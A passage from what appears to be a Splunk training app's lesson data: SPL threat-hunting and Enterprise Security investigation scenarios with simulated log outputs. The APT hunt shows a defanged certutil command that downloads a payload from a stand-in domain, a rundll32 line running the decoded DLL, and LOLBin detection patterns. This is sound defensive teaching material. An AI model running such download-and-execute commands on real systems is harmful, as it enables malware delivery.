                                { 'ComputerName': 'FILESRV-01', 'TargetUserName': 'admin_rthompson', 'first_access': '2024-01-15 02:45:17', 'last_access': '2024-01-15 03:12:44', 'ports': '2' },
                                { 'ComputerName': 'DC-CORP-01', 'TargetUserName': 'admin_rthompson', 'first_access': '2024-01-15 02:48:55', 'last_access': '2024-01-15 03:47:22', 'ports': '3' },
                                { 'ComputerName': 'SQLDB-PROD', 'TargetUserName': 'admin_rthompson', 'first_access': '2024-01-15 03:15:08', 'last_access': '2024-01-15 03:45:19', 'ports': '2' },
                                { 'ComputerName': 'BACKUP-01', 'TargetUserName': 'admin_rthompson', 'first_access': '2024-01-15 03:52:33', 'last_access': '2024-01-15 04:02:11', 'ports': '1' },
                                { 'ComputerName': 'FILESRV-02', 'TargetUserName': 'admin_rthompson', 'first_access': '2024-01-15 04:14:22', 'last_access': '2024-01-15 04:31:45', 'ports': '2' }
                            ]
                        },
                        finding: 'Attacker accessed 7 systems: WKS-FIN-04, WKS-HR-22, FILESRV-01, FILESRV-02, DC-CORP-01, SQLDB-PROD, BACKUP-01. Domain controller was compromised!'
                    }
                ],
                conclusion: `<strong>Complete Attack Timeline Reconstructed</strong><br><br>
                    <table style="width:100%; border-collapse: collapse;">
                    <tr><td style="padding:4px; border:1px solid #333;"><strong>11:47 PM Jan 14</strong></td><td style="padding:4px; border:1px solid #333;">Initial Access - Phishing email opened by rthompson</td></tr>
                    <tr><td style="padding:4px; border:1px solid #333;"><strong>11:52 PM</strong></td><td style="padding:4px; border:1px solid #333;">Malware execution on 10.10.25.44</td></tr>
                    <tr><td style="padding:4px; border:1px solid #333;"><strong>1:47 AM Jan 15</strong></td><td style="padding:4px; border:1px solid #333;">Credential harvesting (mimikatz)</td></tr>
                    <tr><td style="padding:4px; border:1px solid #333;"><strong>2:15 AM</strong></td><td style="padding:4px; border:1px solid #333;">Lateral movement begins</td></tr>
                    <tr><td style="padding:4px; border:1px solid #333;"><strong>2:45 AM</strong></td><td style="padding:4px; border:1px solid #333;">Domain controller compromised</td></tr>
                    <tr><td style="padding:4px; border:1px solid #333;"><strong>3:30 AM</strong></td><td style="padding:4px; border:1px solid #333;">Ransomware staged on file servers</td></tr>
                    <tr><td style="padding:4px; border:1px solid #333;"><strong>4:31 AM</strong></td><td style="padding:4px; border:1px solid #333;">Ransomware executed (encryption begins)</td></tr>
                    </table><br>
                    <strong>Affected Systems:</strong> 7 systems including DC and file servers<br>
                    <strong>Root Cause:</strong> Phishing email with malicious attachment<br>
                    <strong>Compromised Accounts:</strong> rthompson, admin_rthompson, domain admin account`
            }
        },
        {
            id: 'exp-002',
            title: 'Advanced Threat Hunt: Multi-Stage Attack',
            type: 'scenario',
            difficulty: 'expert',
            duration: '40 min',
            objectives: [
                'Hunt for stealthy attack patterns',
                'Correlate weak signals into strong indicators',
                'Identify living-off-the-land techniques'
            ],
            tags: ['threat-hunting', 'apt', 'lolbins'],
            description: 'Hunt for a sophisticated attacker using legitimate tools to evade detection.',
            content: {
                situation: `Threat intel reports APT group "ShadowBear" is targeting organizations in your sector. Their TTP includes: living-off-the-land binaries, memory-only malware, and slow beaconing. No alerts have fired, but you should hunt proactively.`,
                steps: [
                    {
                        question: 'Start with LOLBin hunting. Find unusual parent-child process relationships for Windows utilities.',
                        hint: 'Look for legitimate tools (certutil, bitsadmin, mshta) with unusual parent processes.',
                        spl: 'index=sysmon EventCode=1 Image IN ("*\\\\certutil.exe", "*\\\\bitsadmin.exe", "*\\\\mshta.exe", "*\\\\regsvr32.exe", "*\\\\rundll32.exe", "*\\\\msiexec.exe") | where NOT match(ParentImage, "(?i)(explorer|services|svchost|cmd|powershell)") | stats count, values(CommandLine) as commands by Image, ParentImage, User | sort -count',
                        analysis: 'Find LOLBins spawned by unusual parents.',
                        output: {
                            columns: ['Image', 'ParentImage', 'User', 'commands', 'count'],
                            rows: [
                                { 'Image': 'C:\\Windows\\System32\\certutil.exe', 'ParentImage': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', 'User': 'jsmith', 'commands': 'certutil -urlcache -split -f hxxps://cdn-update[.]com/font.txt C:\\Users\\jsmith\\AppData\\Local\\Temp\\font.txt', 'count': '3' },
                                { 'Image': 'C:\\Windows\\System32\\rundll32.exe', 'ParentImage': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', 'User': 'mwilson', 'commands': 'rundll32.exe C:\\Users\\mwilson\\AppData\\Local\\Temp\\update.dll,Initialize', 'count': '2' }
                            ]
                        },
                        finding: 'Suspicious: certutil.exe spawned by WINWORD.EXE on 3 systems. This indicates Office macro downloading payloads using certutil.'
                    },
                    {
                        question: 'Check what certutil was downloading. Look for URL connections or decode operations.',
                        hint: 'Parse the certutil command line for URLs or file operations.',
                        spl: 'index=sysmon EventCode=1 Image="*\\\\certutil.exe" ParentImage="*\\\\WINWORD.EXE" | rex field=CommandLine "(?<url>https?://[^\\s]+)" | rex field=CommandLine "-decode\\s+(?<encoded_file>[^\\s]+)\\s+(?<decoded_file>[^\\s]+)" | table _time, host, User, url, encoded_file, decoded_file, CommandLine',
                        analysis: 'Extract the payload details.',
                        output: {
                            columns: ['_time', 'host', 'User', 'url', 'encoded_file', 'decoded_file'],
                            rows: [
                                { '_time': '2024-01-15 09:23:17', 'host': 'WKS-SALES-04', 'User': 'jsmith', 'url': 'hxxps://cdn-update[.]com/font.txt', 'encoded_file': '-', 'decoded_file': '-' },
                                { '_time': '2024-01-15 09:23:45', 'host': 'WKS-SALES-04', 'User': 'jsmith', 'url': '-', 'encoded_file': 'C:\\...\\Temp\\font.txt', 'decoded_file': 'C:\\...\\Temp\\update.dll' },
                                { '_time': '2024-01-15 10:15:33', 'host': 'WKS-MKT-07', 'User': 'mwilson', 'url': 'hxxps://cdn-update[.]com/font.txt', 'encoded_file': '-', 'decoded_file': '-' },
                                { '_time': '2024-01-15 11:42:08', 'host': 'WKS-HR-12', 'User': 'pjones', 'url': 'hxxps://cdn-update[.]com/font.txt', 'encoded_file': '-', 'decoded_file': '-' }
                            ]
                        },
                        finding: 'certutil downloading from hxxps://cdn-update[.]com/font.txt and decoding to C:\\Users\\[user]\\AppData\\Local\\Temp\\update.dll. Classic base64 encoded payload technique!'
                    },
                    {
                        question: 'Track the downloaded DLL. How is it being executed?',
                        hint: 'Look for rundll32 or regsvr32 loading this DLL.',
                        spl: 'index=sysmon (EventCode=1 Image="*rundll32.exe" CommandLine="*update.dll*") OR (EventCode=7 ImageLoaded="*update.dll*") | table _time, host, EventCode, Image, ImageLoaded, CommandLine, User | sort _time',
                        analysis: 'Track DLL execution.',
                        output: {
                            columns: ['_time', 'host', 'EventCode', 'Image', 'ImageLoaded', 'CommandLine', 'User'],
                            rows: [
                                { '_time': '2024-01-15 09:24:02', 'host': 'WKS-SALES-04', 'EventCode': '1', 'Image': 'C:\\Windows\\System32\\rundll32.exe', 'ImageLoaded': '-', 'CommandLine': 'rundll32.exe update.dll,Initialize', 'User': 'jsmith' },
                                { '_time': '2024-01-15 09:24:05', 'host': 'WKS-SALES-04', 'EventCode': '7', 'Image': 'C:\\Windows\\System32\\svchost.exe', 'ImageLoaded': 'C:\\...\\Temp\\update.dll', 'CommandLine': '-', 'User': 'SYSTEM' }
                            ]
                        },
                        finding: 'rundll32.exe loading update.dll with export function "Initialize". DLL also loaded by svchost.exe - indicates process injection!'
                    },
                    {
                        question: 'Check for process injection indicators. Look for suspicious memory operations.',
                        hint: 'Sysmon EventCode 8 (CreateRemoteThread) and 10 (ProcessAccess) show injection.',
                        spl: 'index=sysmon EventCode IN (8, 10) SourceImage="*\\\\svchost.exe" | where NOT match(TargetImage, "(?i)(svchost|csrss|lsass|services)") | stats count, values(TargetImage) as targets by SourceImage, GrantedAccess | where count > 0',
                        analysis: 'Detect process injection.',
                        output: {
                            columns: ['SourceImage', 'GrantedAccess', 'targets', 'count'],
                            rows: [
                                { 'SourceImage': 'C:\\Windows\\System32\\svchost.exe', 'GrantedAccess': '0x1F0FFF', 'targets': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe', 'count': '12' }
                            ]
                        },
                        finding: 'svchost.exe injecting into multiple processes including chrome.exe, teams.exe. GrantedAccess 0x1F0FFF indicates full process access - this is malware!'
                    },
                    {
                        question: 'The malware is hiding in legitimate processes. Hunt for its C2 communication.',
                        hint: 'Look for unusual network connections from processes that normally don\'t connect to the internet.',
                        spl: 'index=sysmon EventCode=3 Image IN ("*\\\\svchost.exe", "*\\\\chrome.exe") | where NOT match(DestinationIp, "^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[0-1]))") | stats count, dc(DestinationIp) as unique_dests, values(DestinationIp) as dest_ips by Image, host | where unique_dests > 5 AND unique_dests < 20',
                        analysis: 'Find C2 connections from injected processes.',
                        output: {
                            columns: ['Image', 'host', 'unique_dests', 'dest_ips', 'count'],
                            rows: [
                                { 'Image': 'C:\\Windows\\System32\\svchost.exe', 'host': 'WKS-SALES-04', 'unique_dests': '8', 'dest_ips': '185.220.101.54, 91.219.237.99, 45.33.32.156, 104.21.44.108, 172.67.182.31, 23.227.38.65, 143.204.215.14, 52.84.150.11', 'count': '156' },
                                { 'Image': 'C:\\Windows\\System32\\svchost.exe', 'host': 'WKS-MKT-07', 'unique_dests': '6', 'dest_ips': '185.220.101.54, 91.219.237.99, 104.21.44.108, 172.67.182.31, 23.227.38.65, 143.204.215.14', 'count': '89' }
                            ]
                        },
                        finding: 'Injected svchost.exe connecting to 8 unique IPs, all on port 443. One IP matches "cdn-update[.]com" - the same domain used for payload delivery. C2 confirmed!'
                    }
                ],
                conclusion: `<strong>APT Activity Confirmed</strong><br><br>
                    <strong>Attack Chain Identified:</strong>
                    <ol>
                        <li>Phishing document with macro</li>
                        <li>LOLBin abuse (certutil for download)</li>
                        <li>Encoded payload delivery</li>
                        <li>DLL execution via rundll32</li>
                        <li>Process injection for stealth</li>
                        <li>C2 via injected legitimate processes</li>
                    </ol><br>
                    <strong>IOCs Identified:</strong>
                    <ul>
                        <li>Domain: cdn-update[.]com</li>
                        <li>File: update.dll (various hashes per host)</li>
                        <li>Behavior: certutil spawned by Office applications</li>
                        <li>Behavior: svchost.exe with unusual network connections</li>
                    </ul><br>
                    <strong>Affected Hosts:</strong> 3 workstations confirmed, hunt for more using IOCs`
            }
        },
        {
            id: 'exp-003',
            title: 'Performance Optimization Challenge',
            type: 'challenge',
            difficulty: 'expert',
            duration: '25 min',
            objectives: [
                'Optimize slow-running searches',
                'Reduce search job resource consumption',
                'Apply SPL best practices'
            ],
            tags: ['performance', 'optimization', 'best-practices'],
            description: 'Take a slow search and make it fast without changing the results.',
            content: {
                problem: `The following search takes 45 minutes to run and times out. Optimize it to complete in under 2 minutes while returning the same results:

\`\`\`
index=* | eval threat_indicator=if(match(src_ip, "185\\.220\\..*") OR match(dest_ip, "185\\.220\\..*"), "yes", "no") | search threat_indicator="yes" | join src_ip [search index=asset_inventory | table ip, hostname, owner] | where isnotnull(hostname) | stats count by src_ip, dest_ip, hostname, owner | sort -count
\`\`\``,
                hints: [
                    'Never start with index=* - specify the actual index',
                    'Move filtering before eval where possible',
                    'Replace join with lookup for better performance',
                    'Filter before aggregating, not after'
                ],
                solution: {
                    spl: `index=firewall (src_ip="185.220.*" OR dest_ip="185.220.*")
| lookup asset_inventory ip as src_ip OUTPUT hostname, owner
| where isnotnull(hostname)
| stats count by src_ip, dest_ip, hostname, owner
| sort -count`,
                    explanation: `Optimizations applied:
1. **Specify index**: Changed from "index=*" to "index=firewall" - huge reduction in data scanned
2. **Push filtering left**: Moved IP filter into the base search instead of eval+search
3. **Use wildcard efficiently**: "185.220.*" in search is faster than regex in eval
4. **Replace join with lookup**: Lookups are orders of magnitude faster than joins for enrichment
5. **Removed unnecessary eval**: threat_indicator column was never used after filtering`
                },
                variations: [
                    {
                        description: 'Alternative using tstats for even faster execution (if data model exists):',
                        spl: '| tstats count from datamodel=Network_Traffic where (All_Traffic.src_ip="185.220.*" OR All_Traffic.dest_ip="185.220.*") by All_Traffic.src_ip, All_Traffic.dest_ip | rename All_Traffic.* as * | lookup asset_inventory ip as src_ip OUTPUT hostname, owner | where isnotnull(hostname)'
                    },
                    {
                        description: 'If you need to run across all indexes, use targeted OR:',
                        spl: 'index=firewall OR index=proxy (src_ip="185.220.*" OR dest_ip="185.220.*") | ...'
                    }
                ]
            }
        }
    ],
    enterpriseSecurity: [
        {
            id: 'es-001',
            title: 'ES for Splunk Users: What Changes',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '20 min',
            objectives: [
                'Understand how ES layers on top of Splunk',
                'Learn the key mental shifts for ES',
                'Know when to use ES tools vs raw SPL'
            ],
            tags: ['es', 'transition', 'fundamentals'],
            description: 'The essential orientation for Splunk users moving to Enterprise Security. Learn what\'s different and what stays the same.',
            content: {
                sections: [
                    {
                        title: 'ES is a Layer, Not a Replacement',
                        body: `<p>The most important thing to understand: <strong>Enterprise Security runs ON TOP of Splunk</strong>. Everything you know still works.</p>
                        <p>ES adds:</p>
                        <ul>
                            <li><strong>Data Models</strong> — Pre-normalized, accelerated data for fast searching</li>
                            <li><strong>Notable Events</strong> — A workflow system for managing alerts</li>
                            <li><strong>Risk Framework</strong> — Accumulated risk scores per user/host instead of individual alerts</li>
                            <li><strong>Dashboards & Workflows</strong> — Pre-built security interfaces</li>
                        </ul>
                        <p>Your raw SPL skills are still valuable. ES just gives you additional, optimized tools.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'The Data Model Shift',
                        body: `<p>In standard Splunk, you search raw indexes:</p>
                        <pre class="spl-example">index=wineventlog EventCode=4625</pre>
                        <p>In ES, the same data is normalized into <strong>data models</strong>. You search the model instead:</p>`,
                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src',
                        explanation: 'This searches the accelerated Authentication data model. It\'s faster AND the field names are standardized across all data sources.'
                    },
                    {
                        title: 'Why Data Models Matter',
                        body: `<p>Data models solve the "every vendor is different" problem:</p>
                        <table style="width:100%; border-collapse: collapse; margin: 1rem 0;">
                            <tr style="border-bottom: 1px solid var(--border-subtle);">
                                <th style="text-align:left; padding: 0.5rem;">Data Source</th>
                                <th style="text-align:left; padding: 0.5rem;">Raw Field</th>
                                <th style="text-align:left; padding: 0.5rem;">CIM Field</th>
                            </tr>
                            <tr><td style="padding: 0.5rem;">Windows</td><td>TargetUserName</td><td>user</td></tr>
                            <tr><td style="padding: 0.5rem;">Linux</td><td>USER</td><td>user</td></tr>
                            <tr><td style="padding: 0.5rem;">Okta</td><td>actor.alternateId</td><td>user</td></tr>
                            <tr><td style="padding: 0.5rem;">AWS</td><td>userIdentity.userName</td><td>user</td></tr>
                        </table>
                        <p>One search, all sources. That's the power of normalization.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'When to Use What',
                        body: `<p>Use <strong>ES data models (tstats)</strong> when:</p>
                        <ul>
                            <li>You need speed on large time ranges</li>
                            <li>You're searching across multiple data sources</li>
                            <li>You don't need access to raw event details</li>
                        </ul>
                        <p>Use <strong>raw index searches</strong> when:</p>
                        <ul>
                            <li>You need fields not in the data model</li>
                            <li>You're troubleshooting specific events</li>
                            <li>Data model acceleration is incomplete</li>
                        </ul>
                        <p><strong>Pro tip:</strong> Start with tstats for the big picture, drill down to raw events for details.</p>`,
                        spl: null,
                        explanation: null
                    }
                ]
            }
        },
        {
            id: 'es-002',
            title: 'Notable Events: Your New Alert Queue',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '20 min',
            objectives: [
                'Understand what notable events are',
                'Learn the notable workflow states',
                'Query and manage notables with SPL'
            ],
            tags: ['es', 'notable', 'workflow', 'alerts'],
            description: 'In standard Splunk you have alerts. In ES, you have notable events — a complete workflow system for security operations.',
            content: {
                sections: [
                    {
                        title: 'Alerts vs Notable Events',
                        body: `<p>In standard Splunk, an alert fires and maybe sends an email. That's it.</p>
                        <p>In ES, alerts create <strong>notable events</strong> — tracked security incidents with:</p>
                        <ul>
                            <li><strong>Status</strong> — New, In Progress, Pending, Resolved, Closed</li>
                            <li><strong>Owner</strong> — Assigned analyst</li>
                            <li><strong>Urgency</strong> — Critical, High, Medium, Low, Informational</li>
                            <li><strong>Comments</strong> — Investigation notes and audit trail</li>
                        </ul>
                        <p>Think of it as a ticketing system built into Splunk.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Where Notables Live',
                        body: `<p>Notable events are stored in a dedicated index. You can query them directly:</p>`,
                        spl: '`notable` | table _time, rule_name, urgency, status, owner, src, dest, user',
                        explanation: 'The `notable` macro queries the notable index with proper field normalization. You\'ll see all your security alerts in one place.'
                    },
                    {
                        title: 'Common Notable Queries',
                        body: `<p>Here are the queries you'll use daily:</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'My Open Notables',
                        body: `<p>See what's assigned to you and needs action:</p>`,
                        spl: '`notable` | where status IN ("new", "in progress") AND owner="your_username" | sort -urgency, _time | table _time, rule_name, urgency, src, dest, user',
                        explanation: 'Replace "your_username" with your actual username. This is your daily working queue.'
                    },
                    {
                        title: 'Today\'s Critical Alerts',
                        body: `<p>Start your shift by checking what's urgent:</p>`,
                        spl: '`notable` earliest=-24h | where urgency="critical" AND status="new" | stats count by rule_name | sort -count',
                        explanation: 'Shows unhandled critical alerts from the last 24 hours, grouped by rule. High counts may indicate an active incident or noisy rule.'
                    },
                    {
                        title: 'The Notable Workflow',
                        body: `<p>When you work a notable, follow this workflow:</p>
                        <ol>
                            <li><strong>Triage</strong> — Review the notable, assign yourself</li>
                            <li><strong>Investigate</strong> — Use the drilldown searches, check related events</li>
                            <li><strong>Document</strong> — Add comments with your findings</li>
                            <li><strong>Resolve</strong> — Update status: True Positive, False Positive, or needs escalation</li>
                        </ol>
                        <p>All actions are logged, creating an audit trail.</p>`,
                        spl: null,
                        explanation: null
                    }
                ]
            }
        },
        {
            id: 'es-003',
            title: 'Risk-Based Alerting: The Philosophy Shift',
            type: 'tutorial',
            difficulty: 'intermediate',
            duration: '25 min',
            objectives: [
                'Understand the RBA philosophy',
                'Learn how risk scores accumulate',
                'Query the risk index effectively'
            ],
            tags: ['es', 'rba', 'risk', 'detection'],
            description: 'The biggest mental shift in ES: moving from "alert per event" to "accumulated risk per entity." This changes everything.',
            content: {
                sections: [
                    {
                        title: 'The Problem with Traditional Alerts',
                        body: `<p>Traditional alerting has a fundamental problem: <strong>alert fatigue</strong>.</p>
                        <p>Each suspicious event triggers an alert. Analysts drown in thousands of low-fidelity alerts, missing real threats in the noise.</p>
                        <p>Risk-Based Alerting (RBA) flips this model:</p>
                        <ul>
                            <li>Instead of alerting on every event, <strong>assign risk points</strong></li>
                            <li>Risk accumulates per user or host over time</li>
                            <li>Alert when an entity's <strong>total risk</strong> exceeds a threshold</li>
                        </ul>
                        <p>Result: Fewer, higher-fidelity alerts focused on entities with multiple suspicious behaviors.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'How Risk Accumulates',
                        body: `<p>Every detection rule can contribute risk instead of (or in addition to) creating a notable:</p>
                        <table style="width:100%; border-collapse: collapse; margin: 1rem 0;">
                            <tr style="border-bottom: 1px solid var(--border-subtle);">
                                <th style="text-align:left; padding: 0.5rem;">Event</th>
                                <th style="text-align:left; padding: 0.5rem;">Risk Score</th>
                                <th style="text-align:left; padding: 0.5rem;">Risk Object</th>
                            </tr>
                            <tr><td style="padding: 0.5rem;">Failed login attempt</td><td>5</td><td>user: jsmith</td></tr>
                            <tr><td style="padding: 0.5rem;">Login from new country</td><td>20</td><td>user: jsmith</td></tr>
                            <tr><td style="padding: 0.5rem;">Accessed sensitive file share</td><td>15</td><td>user: jsmith</td></tr>
                            <tr><td style="padding: 0.5rem;">Large data download</td><td>25</td><td>user: jsmith</td></tr>
                            <tr><td style="padding: 0.5rem; font-weight: bold;">Total Risk</td><td style="font-weight: bold;">65</td><td>→ Alert threshold: 50</td></tr>
                        </table>
                        <p>None of these events alone would warrant an alert. Together, they tell a story.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Querying the Risk Index',
                        body: `<p>Risk events are stored in a dedicated index. Here's how to explore them:</p>`,
                        spl: 'index=risk | stats sum(risk_score) as total_risk, dc(source) as detection_count, values(source) as detections by risk_object | where total_risk > 50 | sort -total_risk',
                        explanation: 'This shows all entities with accumulated risk above 50, what detections contributed, and the total score. This is your high-priority investigation list.'
                    },
                    {
                        title: 'User Risk Timeline',
                        body: `<p>When investigating a high-risk user, build a timeline of what triggered the risk:</p>`,
                        spl: 'index=risk risk_object="jsmith" | table _time, source, risk_score, risk_message | sort _time',
                        explanation: 'Shows every risk event for a specific user in chronological order. Each "source" is the detection rule that contributed risk.'
                    },
                    {
                        title: 'Risk Modifiers',
                        body: `<p>ES can automatically adjust risk based on asset/identity context:</p>
                        <ul>
                            <li><strong>Critical asset</strong> — Risk multiplied by 4x</li>
                            <li><strong>High priority</strong> — Risk multiplied by 3x</li>
                            <li><strong>Executive user</strong> — Risk multiplied by 2x</li>
                        </ul>
                        <p>A failed login to a regular workstation might score 5 points. The same event on a domain controller scores 20.</p>`,
                        spl: null,
                        explanation: null
                    }
                ]
            }
        },
        {
            id: 'es-004',
            title: 'Your First Notable Investigation',
            type: 'scenario',
            difficulty: 'beginner',
            duration: '25 min',
            objectives: [
                'Navigate the ES Investigation workflow',
                'Use ES tools to gather context',
                'Document findings in the notable'
            ],
            tags: ['es', 'notable', 'investigation', 'workflow'],
            description: 'Walk through a complete notable investigation using ES tools and workflows. Learn the process you\'ll follow every day.',
            content: {
                situation: `You're an analyst on the morning shift. A notable event fired overnight: "Brute Force Access Behavior Detected" with urgency=high. Your task is to investigate using ES tools and determine if this is a true positive.`,
                steps: [
                    {
                        question: 'First, let\'s find the notable and understand what triggered it. How do you query for this specific notable?',
                        hint: 'Query the notable index and filter by rule name.',
                        spl: '`notable` rule_name="Brute Force Access Behavior Detected" earliest=-24h | head 1 | table _time, rule_name, urgency, src, dest, user, owner, status',
                        analysis: 'This retrieves the notable event with its key fields.',
                        output: {
                            columns: ['_time', 'rule_name', 'urgency', 'src', 'dest', 'user', 'owner', 'status'],
                            rows: [
                                { '_time': '2024-01-15 03:42:18', 'rule_name': 'Brute Force Access Behavior Detected', 'urgency': 'high', 'src': '10.45.88.12', 'dest': 'DC01.corp.local', 'user': 'admin_backup', 'owner': 'unassigned', 'status': 'new' }
                            ]
                        },
                        finding: 'Notable triggered at 3:42 AM. Source IP 10.45.88.12 targeted the domain controller (DC01) with the admin_backup account. Status is "new" - no one has looked at this yet.'
                    },
                    {
                        question: 'Before diving into raw logs, let\'s use ES enrichment. What do we know about the source IP from asset inventory?',
                        hint: 'Use the get_asset macro or lookup to enrich the IP.',
                        spl: '| makeresults | eval src="10.45.88.12" | `get_asset(src)` | table src, nt_host, owner, priority, bunit, category',
                        analysis: 'The get_asset macro enriches the IP with asset inventory data.',
                        output: {
                            columns: ['src', 'nt_host', 'owner', 'priority', 'bunit', 'category'],
                            rows: [
                                { 'src': '10.45.88.12', 'nt_host': 'YOURPC-JIM', 'owner': 'Jim Wilson', 'priority': 'low', 'bunit': 'Sales', 'category': 'workstation' }
                            ]
                        },
                        finding: 'The source is a sales workstation owned by Jim Wilson. Why would a Sales workstation be authenticating to a DC at 3 AM with an admin account?'
                    },
                    {
                        question: 'Now let\'s check the identity context. What do we know about the admin_backup account?',
                        hint: 'Use the identity lookup to get user context.',
                        spl: '| makeresults | eval user="admin_backup" | lookup identity_lookup_expanded identity as user | table user, first, last, email, bunit, priority, category',
                        analysis: 'Look up identity information for the targeted account.',
                        output: {
                            columns: ['user', 'first', 'last', 'email', 'bunit', 'priority', 'category'],
                            rows: [
                                { 'user': 'admin_backup', 'first': 'Backup', 'last': 'Service Account', 'email': 'it-ops@company.com', 'bunit': 'IT Operations', 'priority': 'critical', 'category': 'service_account' }
                            ]
                        },
                        finding: 'admin_backup is a critical service account owned by IT Operations. This account should never be used interactively from a workstation.'
                    },
                    {
                        question: 'Let\'s see the authentication pattern. How many failures vs successes from this source?',
                        hint: 'Use tstats against the Authentication data model for speed.',
                        spl: '| tstats count from datamodel=Authentication where Authentication.src="10.45.88.12" Authentication.dest="DC01.corp.local" earliest=-24h by Authentication.action | rename Authentication.action as action',
                        analysis: 'Count authentication outcomes from the attacking workstation to the DC.',
                        output: {
                            columns: ['action', 'count'],
                            rows: [
                                { 'action': 'failure', 'count': '847' },
                                { 'action': 'success', 'count': '1' }
                            ]
                        },
                        finding: 'CRITICAL: 847 failed attempts followed by 1 success. The brute force attack succeeded!'
                    },
                    {
                        question: 'The attacker got in! When exactly did the successful login happen and what happened after?',
                        hint: 'Search raw authentication logs for the successful logon and check subsequent activity.',
                        spl: 'index=wineventlog EventCode=4624 src_ip="10.45.88.12" dest="DC01" user="admin_backup" earliest=-24h | table _time, EventCode, LogonType, src_ip, dest, user | append [search index=wineventlog dest="DC01" user="admin_backup" EventCode IN (4672, 4688) earliest=-24h] | sort _time | head 10',
                        analysis: 'Find the successful logon and look for privilege escalation or command execution.',
                        output: {
                            columns: ['_time', 'EventCode', 'LogonType', 'src_ip', 'dest', 'user'],
                            rows: [
                                { '_time': '2024-01-15 03:47:22', 'EventCode': '4624', 'LogonType': '10', 'src_ip': '10.45.88.12', 'dest': 'DC01', 'user': 'admin_backup' },
                                { '_time': '2024-01-15 03:47:22', 'EventCode': '4672', 'LogonType': '-', 'src_ip': '-', 'dest': 'DC01', 'user': 'admin_backup' },
                                { '_time': '2024-01-15 03:47:45', 'EventCode': '4688', 'LogonType': '-', 'src_ip': '-', 'dest': 'DC01', 'user': 'admin_backup' }
                            ]
                        },
                        finding: 'Successful RDP login (LogonType 10) at 03:47:22, followed by special privilege assignment (4672) and process execution (4688). This is confirmed compromise of a domain controller.'
                    }
                ],
                conclusion: `<strong>Investigation Complete - True Positive Confirmed</strong><br><br>
                    <strong>Summary:</strong> Brute force attack from Jim Wilson's workstation (10.45.88.12) against domain controller DC01. After 847 failed attempts, the admin_backup service account was successfully compromised at 03:47:22.<br><br>
                    <strong>ES Actions Taken:</strong>
                    <ul>
                        <li>Updated notable status to "In Progress" and assigned to yourself</li>
                        <li>Added investigation notes documenting the timeline</li>
                        <li>Created a new notable for "Compromised Service Account" linked to this investigation</li>
                    </ul>
                    <strong>Recommended Response:</strong>
                    <ol>
                        <li>Disable admin_backup account immediately</li>
                        <li>Isolate Jim Wilson's workstation (10.45.88.12)</li>
                        <li>Check DC01 for persistence mechanisms</li>
                        <li>Escalate to incident response team</li>
                        <li>Update notable to "Pending" - awaiting IR team response</li>
                    </ol>`
            }
        },
        {
            id: 'es-005',
            title: 'Investigating a High-Risk User',
            type: 'scenario',
            difficulty: 'intermediate',
            duration: '30 min',
            objectives: [
                'Analyze accumulated risk scores',
                'Correlate multiple detection sources',
                'Build a risk investigation narrative'
            ],
            tags: ['es', 'rba', 'risk', 'investigation', 'user'],
            description: 'A user has exceeded the risk threshold. Multiple detections contributed to their score. Your job is to understand if this represents a real threat or coincidental events.',
            content: {
                situation: `The Risk Analysis dashboard shows user "mthompson" with a risk score of 85, well above the alerting threshold of 50. The score accumulated from 6 different detections over the past 48 hours. You need to determine if this is a coordinated attack or unrelated events.`,
                steps: [
                    {
                        question: 'First, let\'s see what detections contributed to this user\'s risk score.',
                        hint: 'Query the risk index for this specific user.',
                        spl: 'index=risk risk_object="mthompson" earliest=-48h | stats sum(risk_score) as total_risk, count as events by source | sort -total_risk | table source, events, total_risk',
                        analysis: 'Break down risk contributions by detection rule.',
                        output: {
                            columns: ['source', 'events', 'total_risk'],
                            rows: [
                                { 'source': 'Access - Unusual Login Location', 'events': '1', 'total_risk': '25' },
                                { 'source': 'Endpoint - Suspicious PowerShell', 'events': '2', 'total_risk': '20' },
                                { 'source': 'Access - Multiple Failed Authentications', 'events': '1', 'total_risk': '15' },
                                { 'source': 'Data - Large Email Attachment', 'events': '3', 'total_risk': '15' },
                                { 'source': 'Access - After Hours Login', 'events': '1', 'total_risk': '10' }
                            ]
                        },
                        finding: 'Risk came from 5 different detection sources: unusual location, PowerShell, failed auths, email attachments, and after-hours access. These could be related or coincidental.'
                    },
                    {
                        question: 'Let\'s build a timeline. When did each risk event occur?',
                        hint: 'Get the chronological sequence of risk events.',
                        spl: 'index=risk risk_object="mthompson" earliest=-48h | table _time, source, risk_score, risk_message | sort _time',
                        analysis: 'Build the timeline of suspicious events.',
                        output: {
                            columns: ['_time', 'source', 'risk_score', 'risk_message'],
                            rows: [
                                { '_time': '2024-01-14 23:15:00', 'source': 'Access - After Hours Login', 'risk_score': '10', 'risk_message': 'Login outside business hours' },
                                { '_time': '2024-01-14 23:22:00', 'source': 'Access - Multiple Failed Authentications', 'risk_score': '15', 'risk_message': '12 failed logins in 5 minutes' },
                                { '_time': '2024-01-14 23:24:00', 'source': 'Access - Unusual Login Location', 'risk_score': '25', 'risk_message': 'Login from Russia (first time)' },
                                { '_time': '2024-01-15 00:45:00', 'source': 'Endpoint - Suspicious PowerShell', 'risk_score': '10', 'risk_message': 'Base64 encoded command' },
                                { '_time': '2024-01-15 01:12:00', 'source': 'Endpoint - Suspicious PowerShell', 'risk_score': '10', 'risk_message': 'Download cradle detected' },
                                { '_time': '2024-01-15 02:30:00', 'source': 'Data - Large Email Attachment', 'risk_score': '5', 'risk_message': '50MB attachment to external' },
                                { '_time': '2024-01-15 03:15:00', 'source': 'Data - Large Email Attachment', 'risk_score': '5', 'risk_message': '75MB attachment to external' },
